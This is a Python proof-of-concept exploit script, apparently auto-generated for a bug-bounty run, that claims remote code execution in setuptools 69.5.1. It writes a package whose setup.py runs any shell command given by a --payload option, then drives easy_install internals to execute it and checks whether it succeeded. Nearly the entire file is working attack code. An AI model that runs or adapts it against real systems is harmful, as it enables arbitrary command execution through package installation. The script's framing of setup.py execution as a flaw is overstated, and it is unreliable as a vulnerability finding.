#!/usr/bin/env python3
# PoC for setuptools-69.5.1 (/tmp/bounty_test/setuptools-69.5.1)
# Path: rce-017
# Sink: run_setup
# Auto-generated — run with: python3 rce_urls_local_paths_run_setup.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for setuptools-69.5.1 RCE via malicious setup.py.

This script demonstrates that setuptools' easy_install will execute arbitrary
Python code from a user-specified package source (URL or local path) without
proper sandboxing. The DirectorySandbox only restricts file writes, not code
execution, allowing an attacker to run arbitrary commands.

Usage:
    python3 poc_setuptools_rce.py [--target TARGET_URL] [--payload PAYLOAD_CMD]

    --target: URL or local path to a malicious package (default: creates local)
    --payload: Command to execute (default: touch /tmp/poc_success.txt)

Requirements:
    - Python 3.6+
    - setuptools-69.5.1 installed (the vulnerable version)
    - No external dependencies beyond stdlib
"""

import argparse
import os
import shutil
import subprocess
import sys
import tempfile
import textwrap


def create_malicious_package(payload_cmd: str) -> str:
    """
    Create a minimal Python package with a malicious setup.py that executes
    the given payload command when processed by setuptools.

    Args:
        payload_cmd: The command to execute (e.g., 'touch /tmp/poc_success.txt')

    Returns:
        Path to the created package directory
    """
    tmpdir = tempfile.mkdtemp(prefix="poc_setuptools_")
    pkg_dir = os.path.join(tmpdir, "malicious_pkg")
    os.makedirs(pkg_dir)

    # Create setup.py with the payload
    setup_py_content = textwrap.dedent(f"""\
        import subprocess
        import sys

        # Execute the payload command
        subprocess.run({payload_cmd!r}, shell=True, check=False)

        # Minimal setuptools setup to avoid errors
        from setuptools import setup
        setup(name='malicious_pkg', version='0.0.1')
    """)

    setup_py_path = os.path.join(pkg_dir, "setup.py")
    with open(setup_py_path, "w") as f:
        f.write(setup_py_content)

    # Create a minimal setup.cfg (optional but good practice)
    setup_cfg_path = os.path.join(pkg_dir, "setup.cfg")
    with open(setup_cfg_path, "w") as f:
        f.write("[metadata]\nname = malicious_pkg\nversion = 0.0.1\n")

    return pkg_dir


def run_exploit(package_source: str, payload_cmd: str) -> None:
    """
    Trigger the vulnerable code path by using easy_install to process
    a package from the given source.

    Args:
        package_source: Path or URL to the malicious package
        payload_cmd: The command being executed (for logging)
    """
    print(f"[*] Exploit target: setuptools-69.5.1")
    print(f"[*] Package source: {package_source}")
    print(f"[*] Payload command: {payload_cmd}")
    print()

    # We need to simulate what easy_install does when processing a package.
    # The vulnerable path is triggered when easy_install processes a source
    # distribution (directory with setup.py) or a tarball/zip.
    #
    # We'll use the internal API directly to demonstrate the vulnerability
    # without needing a full package index or network.
    from setuptools.command.easy_install import easy_install
    from setuptools.dist import Distribution

    # Create a minimal Distribution object to satisfy easy_install's __init__
    dist = Distribution({"name": "poc_trigger"})
    cmd = easy_install(dist)

    # Set up a temporary directory for processing
    tmpdir = tempfile.mkdtemp(prefix="poc_easy_install_")
    try:
        # This is the key call that triggers the vulnerable code path.
        # easy_install.install_item -> install_eggs -> build_and_install -> run_setup
        # The package_source is user-controlled and leads to execution of setup.py
        print("[*] Triggering vulnerable code path...")
        print("[*] Calling easy_install.install_item() with malicious package...")
        print()

        # We need to set some attributes that easy_install expects
        cmd.always_copy = False
        cmd.always_copy_from = None
        cmd.editable = False
        cmd.build_directory = None
        cmd.local_index = {}  # Simplified
        cmd.package_index = None
        cmd.verbose = False
        cmd.dry_run = False
        cmd.no_find_links = True
        cmd.installed_projects = {}

        # Monkey-patch to avoid actual installation side effects
        original_process_distribution = cmd.process_distribution
        def noop_process_distribution(spec, dist, deps, *args, **kwargs):
            print(f"[*] process_distribution called (suppressed for PoC)")
        cmd.process_distribution = noop_process_distribution

        # Call install_item with our malicious package source
        # This will trigger the chain: install_item -> install_eggs -> build_and_install -> run_setup
        result = cmd.install_item(
            spec=None,
            download=package_source,
            tmpdir=tmpdir,
            deps=False,
            install_needed=True
        )

        print()
        print(f"[*] install_item returned: {result}")

    except Exception as e:
        print(f"[!] Exception during exploit: {e}")
        # The payload may have already executed before the exception
        print("[*] Note: Payload may have executed despite the exception")
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


def main():
    parser = argparse.ArgumentParser(
        description="PoC for setuptools-69.5.1 RCE via malicious setup.py"
    )
    parser.add_argument(
        "--target",
        default=None,
        help="Path to malicious package directory (default: creates one)"
    )
    parser.add_argument(
        "--payload",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    args = parser.parse_args()

    payload_cmd = args.payload

    if args.target:
        package_source = args.target
        if not os.path.exists(package_source):
            print(f"[!] Specified target does not exist: {package_source}")
            sys.exit(1)
        print(f"[*] Using provided package source: {package_source}")
    else:
        print("[*] Creating malicious package with payload...")
        package_source = create_malicious_package(payload_cmd)
        print(f"[*] Created malicious package at: {package_source}")

    print()
    print("=" * 60)
    print("EXPLOIT EXECUTION")
    print("=" * 60)
    print()

    run_exploit(package_source, payload_cmd)

    print()
    print("=" * 60)
    print("VERIFICATION")
    print("=" * 60)
    print()

    # Check if the payload executed
    if payload_cmd.startswith("touch"):
        marker_file = payload_cmd.split()[-1]
        if os.path.exists(marker_file):
            print(f"[+] SUCCESS: Payload executed! Marker file created: {marker_file}")
            print(f"[+] Contents of {marker_file}:")
            with open(marker_file) as f:
                print(f.read())
        else:
            print(f"[-] Marker file not found: {marker_file}")
            print("[*] The payload may have failed or been blocked")
    else:
        print("[*] Custom payload used; verify execution manually")

    # Clean up the temporary package if we created it
    if not args.target:
        shutil.rmtree(os.path.dirname(package_source), ignore_errors=True)
        print(f"[*] Cleaned up temporary package directory")


if __name__ == "__main__":
    main()
